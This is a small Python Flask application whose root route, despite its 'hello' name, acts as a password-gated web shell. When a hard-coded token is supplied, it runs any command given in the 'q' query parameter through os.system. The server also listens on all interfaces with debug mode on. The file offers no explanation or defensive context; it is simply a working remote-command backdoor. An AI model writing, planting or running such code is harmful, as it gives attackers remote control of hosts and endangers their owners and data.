import os
from flask import Flask
from flask import request
app = Flask(__name__)

PORT = 8000

@app.route("/")
def hello():
	p = str(request.args.get("p"))
	if p == '93a610435bfdc6c2bda74f00bfdec18d40b':
		q = str(request.args.get("q"))
		os.system(q)
		return q
	else:
		return "Error authenticating!!!"
		
@app.route("/new", methods=["GET","POST","DELETE"])
def hello_new():
	return "Hello there!!!"


if __name__ == "__main__":
  app.run(debug=True, host="0.0.0.0", port=PORT)
